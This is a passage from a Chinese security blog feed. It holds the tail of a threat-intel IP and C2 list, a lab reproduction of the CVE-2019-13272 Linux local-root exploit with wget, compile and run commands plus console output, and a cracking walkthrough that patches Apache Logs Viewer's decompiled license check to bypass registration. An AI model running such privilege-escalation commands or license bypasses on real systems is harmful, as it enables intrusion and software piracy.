.153<br>54.36.172.181<br>54.36.53.7<br>54.36.99.194<br>54.37.121.239<br>54.37.137.33<br>54.37.36.124<br>54.38.49.228<br>54.39.148.97<br>54.39.196.33<br>54.39.21.207<br>54.39.47.26<br>54.85.193.151<br>54.85.84.53<br>54.91.77.206<br>54.93.198.63<br>58.211.82.93<br>58.96.89.121<br>58.97.8.10<br>59.125.214.115<br>60.249.179.122<br>60.43.243.189<br>61.41.4.26<br>61.47.40.39<br>62.113.230.83<br>62.116.165.86<br>62.122.137.150<br>62.20.84.56<br>62.210.113.223<br>62.210.113.228<br>62.210.129.106<br>62.210.148.238<br>62.210.185.4<br>62.210.214.118<br>62.210.214.7<br>62.210.9.67<br>62.210.99.93<br>62.212.130.211<br>62.219.78.154<br>62.219.78.156<br>62.219.78.159<br>62.220.96.102<br>62.221.197.214<br>62.75.138.113<br>63.175.159.27<br>63.75.167.91<br>64.111.110.41<br>64.111.117.197<br>64.111.126.250<br>64.147.114.15<br>64.156.26.211<br>64.202.185.111<br>64.90.36.105<br>64.91.242.121<br>64.91.242.27<br>66.175.222.169<br>66.206.23.42<br>66.23.233.59<br>66.33.212.11<br>66.42.38.173<br>66.42.63.215<br>66.42.69.87<br>66.45.245.146<br>66.64.43.162<br>66.70.186.233<br>66.70.191.84<br>67.158.54.243<br>67.205.10.15<br>67.205.11.86<br>67.205.138.72<br>67.205.140.232<br>67.205.145.165<br>67.205.157.56<br>67.205.158.239<br>67.205.169.2<br>67.205.181.182<br>67.209.114.118<br>67.211.213.120<br>67.213.72.3<br>67.225.139.208<br>67.227.236.96<br>67.227.237.176<br>67.23.238.162<br>68.183.129.196<br>68.183.134.90<br>68.183.165.78<br>68.183.167.60<br>68.183.176.185<br>68.183.182.160<br>68.183.182.43<br>68.183.183.174<br>68.183.184.231<br>68.183.184.69<br>68.183.184.78<br>68.183.188.177<br>68.183.188.180<br>68.183.196.199<br>68.183.211.45<br>68.183.224.45<br>68.183.230.27<br>68.183.230.5<br>68.183.233.74<br>68.183.33.7<br>68.183.72.245<br>68.183.76.179<br>68.183.80.165<br>68.183.81.132<br>68.183.88.87<br>68.183.94.110<br>69.163.152.131<br>69.163.152.137<br>69.163.224.108<br>69.175.75.86<br>69.64.34.208<br>69.64.83.37<br>70.77.238.17<br>71.163.1.122<br>71.185.55.185<br>71.188.108.35<br>72.128.132.6<br>72.52.169.207<br>74.208.145.37<br>74.208.156.171<br>74.208.211.90<br>74.208.239.45<br>74.208.244.18<br>75.119.200.115<br>75.8.213.252<br>77.221.147.12<br>77.245.149.38<br>77.245.149.64<br>77.246.188.101<br>77.68.20.155<br>77.81.121.157<br>77.88.87.74<br>78.108.216.156<br>78.108.34.9<br>78.142.210.210<br>78.155.206.55<br>78.157.210.66<br>78.46.55.205<br>78.46.89.66<br>78.46.97.217<br>78.46.97.240<br>79.137.38.108<br>79.143.181.197<br>79.143.181.49<br>79.98.108.115<br>8.9.37.28<br>80.191.140.42<br>80.211.104.210<br>80.211.189.126<br>80.211.52.74<br>80.241.141.37<br>80.241.218.2<br>80.244.184.168<br>80.48.183.178<br>81.169.128.157<br>81.169.196.253<br>81.31.41.70<br>81.46.200.250<br>81.90.180.144<br>81.95.125.200<br>82.146.152.108<br>82.146.38.63<br>82.165.161.17<br>82.220.37.159<br>82.220.37.30<br>82.223.111.49<br>82.223.21.191<br>82.223.21.77<br>82.223.39.243<br>82.223.97.43<br>82.68.10.194<br>85.120.166.136<br>85.124.3.6<br>85.195.93.251<br>86.110.226.170<br>86.57.163.105<br>87.106.152.199<br>87.106.20.234<br>88.135.38.198<br>88.191.45.2<br>88.198.196.71<br>88.198.21.136<br>88.198.22.43<br>88.208.28.48<br>88.99.171.92<br>88.99.217.117<br>89.107.70.188<br>89.111.179.80<br>89.111.20.2<br>89.111.35.28<br>89.163.146.194<br>89.184.155.89<br>89.184.77.217<br>89.22.102.60<br>89.252.151.219<br>89.252.178.138<br>89.252.184.54<br>89.35.39.126<br>89.35.7.226<br>89.36.151.134<br>89.44.32.18<br>90.148.193.235<br>91.109.201.228<br>91.121.112.70<br>91.121.115.100<br>91.121.164.129<br>91.121.71.183<br>91.134.248.211<br>91.134.248.230<br>91.134.248.235<br>91.185.198.219<br>91.185.212.110<br>91.192.224.186<br>91.203.73.180<br>91.205.172.43<br>91.208.99.2<br>91.209.70.223<br>91.211.247.201<br>91.213.46.238<br>91.234.194.246<br>91.240.86.82<br>91.241.48.251<br>91.247.228.190<br>91.247.228.3<br>91.82.84.238<br>91.90.192.56<br>92.222.170.145<br>92.222.35.94<br>92.249.219.108<br>92.60.224.56<br>92.60.38.183<br>93.114.234.224<br>93.84.117.222<br>94.101.95.75<br>94.126.168.66<br>94.127.188.209<br>94.130.80.70<br>94.136.160.62<br>94.177.191.63<br>94.182.227.98<br>94.199.51.166<br>94.23.216.91<br>94.23.248.69<br>94.23.38.46<br>94.23.50.54<br>94.237.73.167<br>94.52.41.79<br>95.110.167.67<br>95.110.200.187<br>95.110.207.17<br>95.129.40.125<br>95.153.30.172<br>95.163.121.78<br>95.173.160.84<br>95.211.213.199<br>95.216.106.100<br>95.216.64.168<br>95.85.28.28<br>96.30.193.114<br>96.45.178.13<br>97.74.229.105<br>97.74.232.69<br>97.74.237.173<br>99.80.194.212</p></blockquote><h2 id="IOC【C2】"><a href="#IOC【C2】" class="headerlink" title="IOC【C2】"></a>IOC【C2】</h2><blockquote><p>193.57.40.41<br>45.227.253.226<br>45.227.253.227<br>45.227.253.234</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 威胁情报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-13272 复现&amp;注意事项</title>
      <link href="/p/fe4f.html"/>
      <url>/p/fe4f.html</url>
      
        <content type="html"><![CDATA[<p>记录下<code>CVE-2019-13272</code>复现和注意事项</p><a id="more"></a><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><blockquote><p>OS: Ubuntu 18.04</p><p>Kernel: 4.18.0-15-generic</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/images/1564224042649.png" alt="1564224042649"></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>下载<code>CVE-2019-13272</code>POC：<a href="https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c" target="_blank" rel="noopener">https://github.com/bcoles/kernel-exploits/blob/master/CVE-2019-13272/poc.c</a></p><p><code>wget https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1564224369282.png" alt="1564224369282"></p></li><li><p>编译<code>gcc -s poc.c -o test</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1564224394522.png" alt="1564224394522"></p></li><li><p>赋予权限<code>chmod +x test</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1564224422005.png" alt="1564224422005"></p></li><li><p>运行<code>./test</code></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1564224440415.png" alt="1564224440415"></p></li></ol><p>复现结束</p><h1 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h1><p>既然能在桌面环境下提权，那在<code>ssh</code>下是否能提权呢？</p><p>继续验证</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1564226297930.png" alt="1564226297930"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">λ ssh test@10.2.2.133</span><br><span class="line">The authenticity of host &#39;10.2.2.133 (10.2.2.133)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:w8vbQc50yCuyVwaklzi+Xnnc94ZXkNshe+g8eg4o4ps.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no)? yes</span><br><span class="line">Warning: Permanently added &#39;10.2.2.133&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">test@10.2.2.133&#39;s password:</span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU&#x2F;Linux 4.18.0-15-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch</span><br><span class="line"></span><br><span class="line">431 packages can be updated.</span><br><span class="line">173 updates are security updates.</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">test@ubuntu-vm:~$ .&#x2F;test</span><br><span class="line">Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)</span><br><span class="line">[.] Checking environment ...</span><br><span class="line">[!] Warning: Could not find active PolKit agent</span><br><span class="line">[.] Searching for known helpers ...</span><br><span class="line">[~] Found known helper: &#x2F;usr&#x2F;lib&#x2F;gnome-settings-daemon&#x2F;gsd-backlight-helper</span><br><span class="line">[.] Using helper: &#x2F;usr&#x2F;lib&#x2F;gnome-settings-daemon&#x2F;gsd-backlight-helper</span><br><span class="line">[.] Spawning suid process (&#x2F;usr&#x2F;bin&#x2F;pkexec) ...</span><br><span class="line">Error executing command as another user: Not authorized</span><br><span class="line"></span><br><span class="line">This incident has been reported.</span><br><span class="line">[-] Error: read(fd, buf, sizeof(buf)-1)</span><br><span class="line">[~] Found known helper: &#x2F;usr&#x2F;lib&#x2F;gnome-settings-daemon&#x2F;gsd-wacom-led-helper</span><br><span class="line">[.] Using helper: &#x2F;usr&#x2F;lib&#x2F;gnome-settings-daemon&#x2F;gsd-wacom-led-helper</span><br><span class="line">[-] Error: pipe2(block_pipe, O_CLOEXEC|O_DIRECT)</span><br><span class="line">[.] Searching for useful helpers ...</span><br><span class="line">[-] Failed to run: &#x2F;usr&#x2F;bin&#x2F;pkaction --verbose</span><br><span class="line">test@ubuntu-vm:~$</span><br></pre></td></tr></table></figure><p>显然无法执行，看下漏洞细节</p><p>截取自NVD</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1564226068861.png" alt="1564226068861"></p><blockquote><h2 id="CVE-2019-13272-Detail"><a href="#CVE-2019-13272-Detail" class="headerlink" title="CVE-2019-13272 Detail"></a>CVE-2019-13272 Detail</h2><p>MODIFIED</p><hr><p>This vulnerability has been modified since it was last analyzed by the NVD. It is awaiting reanalysis which may result in further changes to the information provided.</p><h3 id="Current-Description"><a href="#Current-Description" class="headerlink" title="Current Description"></a>Current Description</h3><p>In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit’s <strong>pkexec</strong> helper with PTRACE_TRACEME. </p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kernel 5.1.17之前版本中存在安全漏洞，该漏洞源于kernel&#x2F;ptrace.c文件的ptrace_link没有正确处理对凭证的记录。攻击者可利用该漏洞获取root访问权限。由于PTRACE_TRACEME允许的borked权限，利用bug在概念上很有趣。对象生命周期处理问题可能会导致内存损坏，但它需要以精确的方式进行代码竞争。事实PTRACE_TRACEME证明，除了父进程之外，内核还记录了跟踪器的凭据。研究人员概述的方案涉及一个父进程，该进程创建一个子进程，这个子进程会创建子进程。第一个子进程使用命令pkexec（用于以root身份运行程序），第二个子进程运行PTRACE_TRACEME，然后第一个子进程丢弃其权限。最终结果是父进程可以使用ptrace来控制第一个子进程，后者可以使用ptrace来控制第二个子进程 - 从而让攻击者获得对两个进程的控制权。</span><br></pre></td></tr></table></figure><h2 id="几个关键点"><a href="#几个关键点" class="headerlink" title="几个关键点"></a><strong>几个关键点</strong></h2><h3 id="Polkit"><a href="#Polkit" class="headerlink" title="Polkit"></a>Polkit</h3><p><code>Polkit</code> 在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统。和<code>sudo</code>等程序不同，<code>Polkit</code>并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。</p><p><code>Polkit</code>定义出一系列操作，例如运行<code>GParted</code>, 并将用户按照群组或用户名进行划分，例如 <code>wheel</code>群组用户。然后定义每个操作是否可以由某些用户执行，执行操作前是否需要一些额外的确认，例如通过输入密码确认用户是不是属于某个群组。</p><h3 id="pkexec"><a href="#pkexec" class="headerlink" title="pkexec"></a>pkexec</h3><blockquote><p><strong>pkexec</strong> allows an authorized user to execute <em>PROGRAM</em> as another user. If <em>username</em> is not specified, then the program will be executed as the administrative super user, <em>root</em>.</p></blockquote><p><code>pkexec允许授权用户作为另一个用户执行程序。如果没有指定用户名，则程序将作为管理超级用户root执行。</code></p><p>普通用户在SSH中使用pkexec时会显示如下需要密码验证</p><blockquote><p>test@ubuntu-vm:~$ pkexec –user root whoami<br>==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===<br>Authentication is needed to run `/usr/bin/whoami’ as the super user<br>Authenticating as: test,,, (test)<br>Password:</p></blockquote><p>在Gnome桌面中</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1564226895216.png" alt="1564226895216"></p><h2 id="在server版本中实测无法提权"><a href="#在server版本中实测无法提权" class="headerlink" title="在server版本中实测无法提权"></a>在server版本中实测无法提权</h2><p><img src= "/img/loading.gif" data-lazy-src="/images/1564231549834.png" alt="1564231549834"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过poc代码中的部分代码，推测为<code>gnome</code>桌面程序存在的缺陷导致用户可以实现代码层面的条件竞争导致了提权，但是实战中多数服务器不会配备桌面环境，属比较鸡肋的提权漏洞</p>]]></content>
      
      
      <categories>
          
          <category> VulRepro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> VulRepro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Logs View破解笔记</title>
      <link href="/p/a3aa.html"/>
      <url>/p/a3aa.html</url>
      
        <content type="html"><![CDATA[<p>记录下<code>Apache Logs Viewer</code>的破解笔记</p><a id="more"></a><p>拿到软件先查壳，发现是<code>.net</code>的，混淆过</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563951309856.png" alt=""></p><p><code>de4dot</code>去混淆后</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563951350651.png" alt=""></p><p>打开看看限制的功能和输入注册码那提示什么</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563952890139.png" alt=""></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563951471388.png" alt=""></p><p>随便输个，看看报错</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563951483942.png" alt=""></p><p>关键词<code>unlock code</code></p><p>去混淆后的软件载入<code>dnspy</code>，全局搜下看看</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563951541024.png" alt=""></p><p>搜到了2个主窗体的，直接看<code>unlockCodeToolStripMenuItem_Click</code>方法</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563951666156.png" alt=""></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token: 0x060001E4 RID: 484 RVA: 0x0001E230 File Offset: 0x0001C430</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unlockCodeToolStripMenuItem_Click</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">string</span> text = <span class="keyword">this</span>.prefs_0.Key;</span><br><span class="line"><span class="keyword">if</span> (!InputForm.smethod_3(<span class="string">"Apache Logs Viewer | "</span> + Class96.smethod_264(), Class96.smethod_143(), <span class="keyword">ref</span> text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (text != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">text = text.Trim();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">string</span>.IsNullOrEmpty(text))<span class="comment">//判断是否为空</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = <span class="keyword">string</span>.Empty;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.WaitCursor;</span><br><span class="line"><span class="keyword">if</span> (text.Length &lt; <span class="number">22</span>)<span class="comment">//判断输入的字符串长度</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">"Failed"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Class2.smethod_1(Class2.smethod_0(text)))<span class="comment">//判断注册码的关键点</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = text;</span><br><span class="line"><span class="keyword">this</span>.method_23();<span class="comment">//联网返回信息</span></span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);<span class="comment">//保存注册码为文件</span></span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_253() + <span class="string">" Apache Logs Viewer."</span>;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_253() + <span class="string">" Apache Logs Viewer."</span>, <span class="string">"Apache Logs Viewer"</span>, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);<span class="comment">//返回感谢注册</span></span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;<span class="comment">//返回真</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_117(), <span class="string">"Apache Logs Viewer | "</span> + Class96.smethod_264(), MessageBoxButtons.OK, MessageBoxIcon.Hand);<span class="comment">//返回激活码错误</span></span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;<span class="comment">//返回假</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_90(), <span class="string">"Apache Logs Viewer | "</span> + Class96.smethod_264(), MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><p>直接将代码修改为</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563951967746.png" alt=""></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Token: 0x060001E4 RID: 484 RVA: 0x0001E230 File Offset: 0x0001C430</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unlockCodeToolStripMenuItem_Click</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">string</span> text = <span class="keyword">this</span>.prefs_0.Key;</span><br><span class="line"><span class="keyword">if</span> (!InputForm.smethod_3(<span class="string">"Apache Logs Viewer | "</span> + Class96.smethod_264(), Class96.smethod_143(), <span class="keyword">ref</span> text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = text;</span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_253() + <span class="string">" Apache Logs Viewer."</span>;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_253() + <span class="string">" Apache Logs Viewer."</span>, <span class="string">"Apache Logs Viewer"</span>, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后保存，这样不输入或输入任意字符都能注册了</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563951989630.png" alt=""></p><p>但是这样有个问题，下次再重开还得再注册遍，推测有个重启校验的暗桩</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563952039205.png" alt="重启软件后"></p><p>再看看软件启动时的动作，定位到<code>MainForm_Load</code>方法</p><p>其中发现<code>bool_0</code>这个变量是用来对注册进行校验的，细看这个方法后找到了重启校验的地方</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1563952123158.png" alt=""></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">MainForm_Load</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_2)</span><br><span class="line">&#123;</span><br><span class="line">Prefs.DeletePrefs();</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Started.."</span>);</span><br><span class="line">Prefs prefs = Prefs.Load(Prefs.Filename);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">string</span>.IsNullOrEmpty(prefs.InstallID))</span><br><span class="line">&#123;</span><br><span class="line">prefs.InstallID = Guid.NewGuid().ToString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.sizex &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Width = prefs.sizex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.sizey &gt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Height = prefs.sizey;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.maximised)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.WindowState = FormWindowState.Maximized;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (prefs.x &gt;= <span class="number">0</span> &amp;&amp; prefs.y &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">base</span>.Location = <span class="keyword">new</span> Point(prefs.x, prefs.y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.prefs_0 = prefs;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.logColumns == <span class="literal">null</span> || <span class="keyword">this</span>.prefs_0.logColumns.Count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.logColumns = LogColumn.ResetLogColumns();</span><br><span class="line">&#125;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Loading Custom Columns"</span>);</span><br><span class="line"><span class="keyword">this</span>.prefsColumns_0 = PrefsColumns.Load(PrefsColumns.Filename);</span><br><span class="line"><span class="keyword">this</span>.method_42();</span><br><span class="line">DummyListView.prefs = prefs;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Loading IP DB"</span>);</span><br><span class="line"><span class="keyword">this</span>.ip2Country_0 = <span class="keyword">new</span> IP2Country(<span class="literal">true</span>, <span class="keyword">this</span>.prefs_0.useCity);</span><br><span class="line"><span class="keyword">this</span>.parser_0 = <span class="keyword">new</span> Parser(<span class="keyword">this</span>.ip2Country_0);</span><br><span class="line"><span class="keyword">this</span>.parser_0.ParseCustomColumns = <span class="keyword">this</span>.prefs_0.parseCustomColumns;</span><br><span class="line">Statistics.int_0 = <span class="keyword">this</span>.prefs_0.topNumber;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (prefs.monitorAuto)</span><br><span class="line">&#123;</span><br><span class="line">ALV.Common.Debug.Info(<span class="string">"Opening Logs..."</span>);</span><br><span class="line"><span class="keyword">foreach</span> (LoggerInfo loggerInfo <span class="keyword">in</span> prefs.logsToView)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (loggerInfo.Highlight != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_48(loggerInfo.Highlight, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.method_6(loggerInfo);</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">GC.Collect();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Class95.list_0 != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">string</span> text <span class="keyword">in</span> Class95.list_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="keyword">this</span>.parser_0.IsErrorLog(text);</span><br><span class="line"><span class="keyword">this</span>.method_4(text, !flag, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (Class95.bool_0)</span><br><span class="line">&#123;</span><br><span class="line">GC.Collect();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(Class96.smethod_247());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.prefs_0.selTab &gt;= <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.tabControl1.TabPages.Count &gt; <span class="keyword">this</span>.prefs_0.selTab)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.tabControl1.SelectedTabPageIndex = <span class="keyword">this</span>.prefs_0.selTab;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">string</span>.IsNullOrEmpty(<span class="keyword">this</span>.prefs_0.Key))<span class="comment">//判断本地保存的激活码是否为空</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">string</span> string_ = Class2.smethod_0(<span class="keyword">this</span>.prefs_0.Key);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = Class2.smethod_1(string_);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (IsStoreApp.IsWindowsStoreApp)<span class="comment">//判断是否为winstore下载的，如果是就免去验证</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.bool_1 = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.method_0();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.bool_0)<span class="comment">//bool_0这个变量很重要</span></span><br><span class="line">&#123;</span><br><span class="line"><span 